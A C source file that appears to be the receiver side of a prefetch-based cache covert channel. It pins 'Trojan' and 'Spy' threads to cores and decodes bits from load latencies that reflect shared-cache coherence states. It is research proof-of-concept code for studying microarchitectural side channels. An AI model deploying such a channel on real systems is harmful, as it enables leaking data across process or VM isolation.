#define _GNU_SOURCE
#include "util.h"
#include "math.h"
#include "sched.h"
#include "pthread.h"
#include "semaphore.h"


/*
 * Detects a bit by measuring the access time of the load from config->addr
 * within the clock length of config->interval.
 *
 * Detect a bit 1 if hits LLC E/M (remote L1)
 * Detect a bit 0 if hits LLC S
 *
 * Within one iteration, the operations from sender, Trojan (receiver_helper), Spy (receiver) are ordered by the amount of rdtscp() each thread runs before the operation.
 * This is a weak ordering, and the amount of rdtscp() each thread needs (the value of i) may need to be adjusted on each processor.
 */

sem_t sem_trojan;
sem_t sem_spy;

void detect_bit(struct config *config, int index, int* result)
{
  int i = 0;
  CYCLES access_time; 

  access_time = measure_one_block_access_time(config->addr); 
  //result[index] = (access_time < LLC_S_LATENCY);
  int access = (access_time < LLC_S_LATENCY);
  write(1, &access, sizeof(int));
  printf("%d\n", access);

}


void prefetch_bit(struct config *config)
{
    int i = 0;

	// Sync with sender
	CYCLES start_t = cc_sync();
  asm volatile("lfence");
   
  __builtin_prefetch(config->addr, 1, 3);

}

void delayloop(CYCLES cycles) {
  CYCLES start = rdtscp();
  while ((rdtscp()-start) < cycles)
    ;
}


void* receiver_func( void* param)
{
	// Initialize config and local variables
	struct config config;
	init_config(&config);
  int counter = 0;
  int result[ROUNDS];

  //access the target addr a few times to ensure that prefetchw works later
  CYCLES access_time = measure_one_block_access_time(config.addr);
  access_time = measure_one_block_access_time(config.addr);
  access_time = measure_one_block_access_time(config.addr);

	//while (counter < ROUNDS) {
  for(;;) {

    sem_wait(&sem_trojan);
    delayloop(10000);
    asm volatile("lfence");
		detect_bit(&config, counter, result);
    counter++;

    sem_post(&sem_spy);
	}
    
  for(int a = 0; a < ROUNDS; a++)
    printf("%d\n", result[a]);

	printf("Receiver finished\n");
}

void* helper_func( void* param)
{
	// Initialize config and local variables
	struct config config;
	init_config(&config);
  int counter = 0;

  //access the target addr a few times to ensure that prefetchw works later
  CYCLES access_time = measure_one_block_access_time(config.addr);
  access_time = measure_one_block_access_time(config.addr);
  access_time = measure_one_block_access_time(config.addr);

	//while (counter < ROUNDS) {
  for(;;) {
    sem_wait(&sem_spy);

    asm volatile("lfence");
		prefetch_bit(&config);
    counter++;

    sem_post(&sem_trojan);
	}

	printf("Helper finished\n");
}



int main(int argc, char *argv[]) {
  pthread_t receiver, receiver_helper;
  printf("%s\n", "Starting\n");

  sem_init(&sem_trojan, 0, 1);
  sem_init(&sem_spy, 0, 0);

  pthread_attr_t attr_receiver;
  pthread_attr_t attr_helper;
  pthread_attr_init(&attr_receiver);
  pthread_attr_init(&attr_helper);

  cpu_set_t mask;
  CPU_ZERO(&mask);
  CPU_SET(receiver_core, &mask);
  if (pthread_attr_setaffinity_np(&attr_receiver, sizeof(mask), &mask) != 0) {
    perror("pthread_attr_setaffinity_np: receiver");
  }

  CPU_ZERO(&mask);
  CPU_SET(receiver_helper_core, &mask);
  if (pthread_attr_setaffinity_np(&attr_helper, sizeof(mask), &mask) != 0) {
    perror("pthread_attr_setaffinity_np: helper");
  }
  printf("created thread\n");

  if (pthread_create(&receiver, &attr_receiver, (void *)receiver_func, NULL) !=
      0) {
    perror("pthread_create: receiver");
  }
  if (pthread_create(&receiver_helper, &attr_helper, (void *)helper_func, NULL) !=
      0) {
    perror("pthread_create: helper");
  }

  pthread_join(receiver, NULL);
  pthread_join(receiver_helper, NULL);

  sem_destroy(&sem_trojan);
  sem_destroy(&sem_spy);
}



